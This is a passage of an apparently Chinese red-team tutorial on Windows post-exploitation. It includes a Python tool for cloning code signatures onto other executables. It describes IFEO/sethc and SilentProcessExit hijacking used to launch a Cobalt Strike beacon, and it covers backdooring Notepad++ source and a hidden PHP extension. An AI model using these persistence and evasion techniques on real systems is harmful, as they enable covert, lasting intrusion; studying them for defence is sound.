    with <span class="token function">open</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> as g<span class="token punctuation">:</span>
        with <span class="token function">open</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> as f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span>flItms<span class="token punctuation">[</span><span class="token string">'CertTableLOC'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span>exe<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">struct</span><span class="token punctuation">.</span><span class="token function">pack</span><span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>cert<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> io<span class="token punctuation">.</span><span class="token constant">SEEK_END</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>cert<span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Signature appended. \nFIN."</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    usage <span class="token operator">=</span> <span class="token string">'usage: %prog [options]'</span>
    parser <span class="token operator">=</span> <span class="token function">OptionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_option</span><span class="token punctuation">(</span><span class="token string">"-i"</span><span class="token punctuation">,</span> <span class="token string">"--file"</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">"inputfile"</span><span class="token punctuation">,</span> 
                  help<span class="token operator">=</span><span class="token string">"input file"</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">"FILE"</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_option</span><span class="token punctuation">(</span><span class="token string">'-r'</span><span class="token punctuation">,</span> <span class="token string">'--rip'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'ripsig'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span>
                  help<span class="token operator">=</span><span class="token string">'rip signature off inputfile'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_option</span><span class="token punctuation">(</span><span class="token string">'-a'</span><span class="token punctuation">,</span> <span class="token string">'--add'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'addsig'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span>
                  help<span class="token operator">=</span><span class="token string">'add signautre to targetfile'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_option</span><span class="token punctuation">(</span><span class="token string">'-o'</span><span class="token punctuation">,</span> <span class="token string">'--output'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'outputfile'</span><span class="token punctuation">,</span>
                  help<span class="token operator">=</span><span class="token string">'output file'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_option</span><span class="token punctuation">(</span><span class="token string">'-s'</span><span class="token punctuation">,</span> <span class="token string">'--sig'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'sigfile'</span><span class="token punctuation">,</span>
                  help<span class="token operator">=</span><span class="token string">'binary signature from disk'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_option</span><span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--target'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'targetfile'</span><span class="token punctuation">,</span>
                  help<span class="token operator">=</span><span class="token string">'file to append signature to'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_option</span><span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--checksig'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'checksig'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span>
                  help<span class="token operator">=</span><span class="token string">'file to check if signed; does not verify signature'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">add_option</span><span class="token punctuation">(</span><span class="token string">'-T'</span><span class="token punctuation">,</span> <span class="token string">'--truncate'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">"truncate"</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span>
                  help<span class="token operator">=</span><span class="token string">'truncate signature (i.e. remove sig)'</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parse_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token macro property"># rip signature</span>
    <span class="token macro property"># inputfile and rip to outputfile</span>
    <span class="token keyword">if</span> options<span class="token punctuation">.</span>inputfile and options<span class="token punctuation">.</span>ripsig<span class="token punctuation">:</span>
        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Ripping signature to file!"</span><span class="token punctuation">)</span>
        <span class="token function">outputCert</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>inputfile<span class="token punctuation">,</span> options<span class="token punctuation">.</span>outputfile<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    

    <span class="token macro property"># copy from one to another</span>
    <span class="token macro property"># inputfile and rip to targetfile to outputfile    </span>
    <span class="token keyword">if</span> options<span class="token punctuation">.</span>inputfile and options<span class="token punctuation">.</span>targetfile<span class="token punctuation">:</span>
        cert <span class="token operator">=</span> <span class="token function">copyCert</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>inputfile<span class="token punctuation">)</span>
        <span class="token function">writeCert</span><span class="token punctuation">(</span>cert<span class="token punctuation">,</span> options<span class="token punctuation">.</span>targetfile<span class="token punctuation">,</span> options<span class="token punctuation">.</span>outputfile<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token macro property"># check signature</span>
    <span class="token macro property"># inputfile </span>
    <span class="token keyword">if</span> options<span class="token punctuation">.</span>inputfile and options<span class="token punctuation">.</span>checksig<span class="token punctuation">:</span>
        <span class="token function">check_sig</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>inputfile<span class="token punctuation">)</span> 
        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token macro property"># add sig to target file</span>
    <span class="token keyword">if</span> options<span class="token punctuation">.</span>targetfile and options<span class="token punctuation">.</span>sigfile<span class="token punctuation">:</span>
        <span class="token function">signfile</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>targetfile<span class="token punctuation">,</span> options<span class="token punctuation">.</span>sigfile<span class="token punctuation">,</span> options<span class="token punctuation">.</span>outputfile<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        
    <span class="token macro property"># truncate</span>
    <span class="token keyword">if</span> options<span class="token punctuation">.</span>inputfile and options<span class="token punctuation">.</span>truncate<span class="token punctuation">:</span>
        <span class="token function">truncate</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>inputfile<span class="token punctuation">,</span> options<span class="token punctuation">.</span>outputfile<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    parser<span class="token punctuation">.</span><span class="token function">print_help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"You must do something!"</span><span class="token punctuation">)</span>

</code></pre>
<hr>
<h2><a id="7122_windows_5084"></a>7.1.2.2 常见windows持久控制总结</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">6461</span>

http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>sins7<span class="token punctuation">.</span>cn<span class="token operator">/</span>summary<span class="token operator">-</span>of<span class="token operator">-</span>windows<span class="token operator">-</span>persistence<span class="token operator">-</span>backdoor<span class="token operator">-</span><span class="token keyword">for</span><span class="token operator">-</span>intranet<span class="token operator">-</span>penetration<span class="token operator">/</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>system<span class="token operator">/</span><span class="token number">229209.</span>html
</code></pre>
<hr>
<h2><a id="7123_Windows_RID_5095"></a>7.1.2.3 Windows RID劫持</h2>
<p>Rid_Hijack模块是一个关于后渗透阶段用来维持权限的模块…利用</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">2998</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>system<span class="token operator">/</span><span class="token number">169925.</span>html
</code></pre>
<hr>
<h2><a id="7124_Shfit_5105"></a>7.1.2.4 Shfit映像劫持后门新玩法</h2>
<p><strong>映像劫持简介</strong></p>
<p>映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。</p>
<p>映像劫持其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。</p>
<p><strong>简单测试</strong></p>
<p>映像劫持技术的利用，存在已久，这里再简单说明下：修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下sethc.exe，添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\windows\system32\cmd.exe</p>
<p><img src="https://img-blog.csdnimg.cn/2020100510330555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
之后键入五下Shift执行sethc.exe程序时便会执行cmd.exe程序。<br>
<img src="https://img-blog.csdnimg.cn/20201005103315110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>映像劫持后门新玩法</strong></p>
<p><strong>实现效果</strong></p>
<p>键入五下Shift执行时，先执行sethc.exe程序，当sethc.exe程序静默退出时，执行CobaltStrike的Powershell，反弹Beacon shell 。</p>
<p>简单来说就是：程序A静默退出结束后，会执行程序B。</p>
<p><strong>GFlages测试</strong></p>
<p>文章地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>link<span class="token punctuation">.</span>zhihu<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token operator">?</span>target<span class="token operator">=</span>https<span class="token operator">%</span><span class="token number">3</span>A<span class="token comment">//blogs.msdn.microsoft.com/junfeng/2004/04/28/image-file-execution-options/</span>
</code></pre>
<p>下载gflags.exe</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>zh<span class="token operator">-</span>cn<span class="token operator">/</span>previous<span class="token operator">-</span>versions<span class="token operator">/</span>msdn10<span class="token operator">/</span><span class="token function">gg463016</span><span class="token punctuation">(</span>v<span class="token operator">=</span>msdn<span class="token punctuation">.</span><span class="token number">10</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201005103423579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
根据微软的官方文档描述，在Silent Process Exit选项卡中的配置，都保存在注册表中。</p>
<p>GFlags工具自动添加并修改了“IFEO”目录下sethc.exe的GlobalFlag值<br>
<img src="https://img-blog.csdnimg.cn/20201005103435235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
以及SilentProcessExit下ReportingMode和MonitorProcess两个值。<br>
<img src="https://img-blog.csdnimg.cn/20201005103449635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这时测试会发现，当键入五下Shift时，先执行sethc.exe程序，当sethc.exe程序静默退出时，便会执行cmd.exe程序。</p>
<p>这么一来，可以直接在命令行中对注册表进行设置。（需要管理员权限）</p>
<pre><code class="prism language-c"><span class="token number">1</span>
</code></pre>
<p>简单解释一下ReportingMode和MonitorProcess 这两个项值的作用。MonitorProcess的值表示监视器进程。Reporting Mode可以设置为三个值 。</p>
<p>FlagValue解释LAUNCH_MONITORPROCESS0x1检测到进程静默退出时，将会启动监视器进程（在GFLAGS.exe中，Silent Process Exit这个选项卡所填写的值，即MonitorProcess的项值）LOCAL_DUMP0x2检测到进程静默退出时，将会为受监视的进程创建转储文件NOTIFICATION0x4检查到进程静默退出时，将会弹出一个通知</p>
<p><strong>与CobaltStrike结合利用</strong></p>
<p>换位思考，用上述的方法，修改MonitorProcess值放入CobaltStrike的powershell。这样，可以在渗透中做到权限的维持，按五下Shift就可以隐蔽进行反连。<br>
<img src="https://img-blog.csdnimg.cn/20201005103545501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
实测，Windows锁屏，键入五下Shift后正常弹粘滞键，关闭之后执行powershell代码，反弹beacon的shell<br>
<img src="https://img-blog.csdnimg.cn/20201005103557308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>zhuanlan<span class="token punctuation">.</span>zhihu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">98526538</span>
</code></pre>
<hr>
<h2><a id="7124_windows_5171"></a>7.1.2.4 windows权限维持篇-注册表维权</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>bypass007<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span>Emergency<span class="token operator">-</span>Response<span class="token operator">-</span>Notes<span class="token operator">/</span>privilege<span class="token operator">/</span>第<span class="token number">4</span>篇：Linux权限维持<span class="token operator">--</span>后门篇<span class="token punctuation">.</span>html

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1553305</span>

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>xiaozi<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">11798030.</span>html <span class="token operator">--</span><span class="token operator">-</span>Window权限维持（一）：注册表运行键
</code></pre>
<p>书上的知识点很详细的介绍了，思路很清晰！！！</p>
<hr>
<h2><a id="7125_windows2_5183"></a>7.1.2.5 windows权限维持篇2-计划任务维权</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>xiaozi<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">11797078.</span>html  
</code></pre>
<p>书上的知识点很详细的介绍了，思路很清晰！！！</p>
<hr>
<h2><a id="7126_windows_3service_5191"></a>7.1.2.6 windows 权限维持篇3-服务service维权</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>xiaozi<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">11815957.</span>html
</code></pre>
<p>书上的知识点很详细的介绍了，思路很清晰！！！<br>
介绍了命令行方式添加服务、powershell形式添加服务、SharPersist添加服务进行、Metasploit服务维权模块进行权限维持讲解！！</p>
<hr>
<h2><a id="72__5200"></a>7.2 第三方组件后门</h2>
<p>开始Windows也简单介绍了…</p>
<h2><a id="721_APT_5203"></a>7.2.1 APT对抗（一）红蓝对抗关于后门对抗</h2>
<p>当我们接到某个项目的时候，它已经是被入侵了。甚至已经被脱库，或残留后门等持续攻击洗库。</p>
<p><strong>后渗透攻击者的本质是什么？</strong></p>
<p>阻止防御者信息搜集，销毁行程记录，隐藏存留文件。</p>
<p><strong>防御者的本质是什么？</strong></p>
<p>寻找遗留信息，发现攻击轨迹与样本残留并且阻断再次攻击。</p>
<p>那么这里攻击者就要引入“持续攻击”，防御者就要引入“溯源取证与清理遗留”，攻击与持续攻击的分水岭是就是后渗透持续攻击，而表现形式其中之一就是后门。</p>
<p><strong>1.后门的种类</strong></p>
<p><strong>本地后门：</strong></p>
<p>如系统后门，这里指的是装机后自带的某   功能或者自带软件后门</p>
<p><strong>本地拓展后门：</strong></p>
<p>如iis 6的isapi，iis7的 模块后门</p>
<p><strong>第三方后门：</strong></p>
<p>如apache，serv-u，第三方软件后门</p>
<p><strong>第三方扩展后门：</strong></p>
<p>如php扩展后门，apache扩展后门，第三方扩展后门</p>
<p><strong>人为化后门：</strong></p>
<p>一般指被动后门，由人为引起触发导致激活，或者传播</p>
<p><strong>2.后门的隐蔽性排行</strong></p>
<p>本地后门&gt;本地拓展后门&gt;第三方后门&gt;第三方扩展后门，这里排除人为化后门，一个优秀的人为化后门会造成的损失不可估计，比如勒索病毒的某些非联网的独立机器，也有被勒索中毒。在比如某微博的蠕虫等。</p>
<p><strong>3.整体概括分类</strong></p>
<p>主动后门，被动后门，传播型后门。</p>
<p><strong>4.后门的几点特性</strong></p>
<p>隐蔽，稳定，持久</p>
<p>一个优秀的后门，一定是具备几点特征的，无文件，无端口，无进程，无服务，无语言码，并且是量身目标制定且一般不具备通用性。</p>
<p><strong>攻击者与防御者的本质对抗是什么？</strong></p>
<p>增加对方在对抗中的时间成本，人力成本。</p>
<p><strong>这里要引用百度对APT的解释：</strong></p>
<p>APT是指高级持续性威胁。利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式，APT攻击的原理相对于其他攻击形式更为高级和先进，其高级性主要体现在APT在发动攻击之前需要对攻击对象的业务流程和目标系统进行精确的收集。</p>
<p><strong>那么关于高级持续渗透后门与上面的解释类似：</strong></p>
<p>高级持续渗透后门是指高级持续性后渗透权限长期把控，利用先进的后渗透手段对特定目标进行长期持续性维持权限的后攻击形式，高级持续渗透后门的原理相对于其他后门形式更为高级和先进，其高级性主要体现在持续渗透后门在发动持续性权限维持之前需要对攻击对象的业务流程和目标系统进行精确的收集并量身制定目标后门。</p>
<p><strong>第一季从攻击者角度来对抗：</strong></p>
<p>项目中一定会接触到溯源，而溯源最重要的环节之一就是样本取证与分析。既然是样本取证，也就是主要找残留文件。可能是脚本，dll，so，exe等。其次是查找相关流量异常，端口，进程。异常日志。</p>
<p>做为攻击者的对抗，无开放端口，无残留文件，无进程，无服务。在防御者处理完攻击事件后的一定时间内，再次激活。</p>
<p>这里要解释一下rootkit，它的英文翻译是一种特殊类型的恶意软件</p>
<p>百度百科是这样解释的：Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的。</p>
<p>在后门的进化中，rootkit也发生了变化，最大的改变是它的系统层次结构发生了变化。</p>
<p><strong>5.后门的生成</strong></p>
<p><strong>大体分为四类：</strong></p>
<pre><code>1.有目标源码

2.无目标源码

3.无目标源码，有目标api

4.无目标源码，无api，得到相关漏洞等待触发
</code></pre>
<p>结合后门生成分类来举例细说几个demo。</p>
<p><strong>5.1 有目标源码</strong></p>
<p>目前大量服务器上有第三方软件。这里以notepad++为例。</p>
<p>Notepad++是 Windows操作系统下的一套文本编辑器，有完整的中文化接口及支持多国语言编写的功能，并且免费开源。</p>
<p>开源项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>notepad<span class="token operator">-</span>plus<span class="token operator">-</span>plus<span class="token operator">/</span>notepad<span class="token operator">-</span>plus<span class="token operator">-</span>plus
</code></pre>
<p>Demo 环境：windows 7 x64，notepad++(x64)</p>
<p>Demo IDE：vs2017</p>
<p>在源码中，我们修改每次打开以php结尾的文件，先触发后门，在打开文件。其他文件跳过触发后门。<br>
<img src="https://img-blog.csdnimg.cn/2020100511084661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201005110852758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
文件被正常打开。<br>
<img src="https://img-blog.csdnimg.cn/20201005110901402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201005110907401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>优点：</strong></p>
<p>在对抗反病毒，反后门软件中有绝对优势，可本地多次调试，稳定性强壮。跨平台能力非常强壮，并且可以对后门选择方式任意，如主动后门，被动后门，人为化后门等。</p>
<p><strong>缺点：</strong></p>
<p>针对性较强，需要深入了解目标服务器安装或使用软件。需要语言不确定的语言基础。在封闭系统，如Windows下多出现于第三方开源。</p>
<p><strong>5.2 无目标源码</strong></p>
<p><strong>优点：</strong></p>
<p>在对抗反病毒，反后门软件中有一定优势，稳定性良好，跨平台能力一般，并且适用于大多数可操作文件，同样可以选择对后门选择方式任意，如主动后门，被动后门，人为化后门等。</p>
<p><strong>缺点：</strong></p>
<p>稳定性不突出，在修改已生成的二进制文件，容易被反病毒，反后门软件查杀。</p>
<p><strong>5.3 无目标源码，有目标api</strong></p>
<p>目前大多数的Ms_server，内置iis，从windows2000开始，而目前国内市场使用03sp2，08r2为主。在win下又以iis为主，在iis中目前主要分为iis5.x ，iis6.x，大于等于iis7.x。iis7以后有了很大的变化，尤其引入模块化体系结构。iis6.x 最明显的是内置IUSR来进行身份验证，IIS7中，每个身份验证机制都被隔离到自己的模块中，或安装或卸载。</p>
<p>同样，目前国内市场另一种常见组合XAMP（WIN+Apche+mysql+php，与Linux+Apche+mysql+php)，php5.x 与php7.x有了很大的变化，PHP7将基于最初由Zend开发的PHPNG来改进其框架。并且加入新功能，如新运算符，标记，对十六进制的更友好支持等。</p>
<p>Demo 环境：windows 7x86 php5.6.32</p>
<p>Demo IDE：vs2017</p>
<p>php默认有查看加载扩展，命令为php -m，有着部分的默认扩展， 而在扩展中，又可以对自己不显示在扩展列表中</p>
<p><img src="https://img-blog.csdnimg.cn/20201005111016607.png#pic_center" alt="在这里插入图片描述"><br>
php.ini 配置<br>
<img src="https://img-blog.csdnimg.cn/20201005111040888.png#pic_center" alt="在这里插入图片描述"></p>
<p>以Demo.php为例，demo.php代码如下:<img src="https://img-blog.csdnimg.cn/20201005111049943.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201005111055173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
在访问demo.php，post带有触发后门特征，来执行攻击者的任意php代码。在demo中，仅仅是做到了，无明显的以php后缀为结尾的后门，那么结合第一条，有目标源码为前提，来写入其他默认自带扩展中，来达到更隐蔽的作用。</p>
<p><strong>优点：</strong></p>
<p>在对抗反病毒，反后门软件中有绝对优势，可本地多次调试，稳定性非常强壮。跨平台能力非常强壮，且可以对后门选择方式任意，如主动后门，被动后门，人为化后门等。</p>
<p><strong>缺点：</strong></p>
<p>在编译后门的时候，需要查阅大量API，一个平台到多个平台的相关API。调试头弄，失眠，吃不下去饭。领导不理解，冷暖自知。</p>
<p>第二季从防御者角度来对抗。</p>
<p><strong>后者的话</strong></p>
<p>目前国内市场的全流量日志分析，由于受制于存储条件等因素，大部分为全流量，流量部分分析。那么在高级持久性后门中，如何建立一个伪流量非实用数据来逃逸日志分析，这应该是一个优秀高级持续后门应该思考的问题。</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1497360</span>
</code></pre>
<h2><a id="722_APT_5370"></a>7.2.2 APT对抗（二）红蓝对抗关于后门对抗</h2>
<p>第二季</p>
<p><strong>这次继续围绕第一篇，第一季关于后门：</strong></p>
<p>《APT对抗（一） 红蓝对抗关于后门对抗》做整理与补充。再深入一步细化demo notepad++</p>
<p>后门是渗透测试的分水岭，它分别体现了攻击者对目标机器的熟知程度，环境，编程语言，了解对方客户，以及安全公司的本质概念。这样的后门才能更隐蔽，更长久。</p>
<p>而对于防御者需要掌握后门的基本查杀，与高难度查杀，了解被入侵环境，目标机器。以及后门或者病毒可隐藏角落，或样本取证，内存取证。</p>
<p>所以说后门的安装与反安装是一场考试，一场实战考试。</p>
<p>作为攻击者，要首先考虑到对抗成本，什么样的对抗成本。影响或阻碍对手方的核心利益。把概念加入到后门，更隐蔽，更长久。</p>
<p>文章的标题既然为APT对抗（二） 红蓝对抗关于后门对抗，那么文章的本质只做技术研究，Demo本身不具备攻击或者持续控制权限功能。</p>
<p><strong>Demo连载第二季：</strong></p>
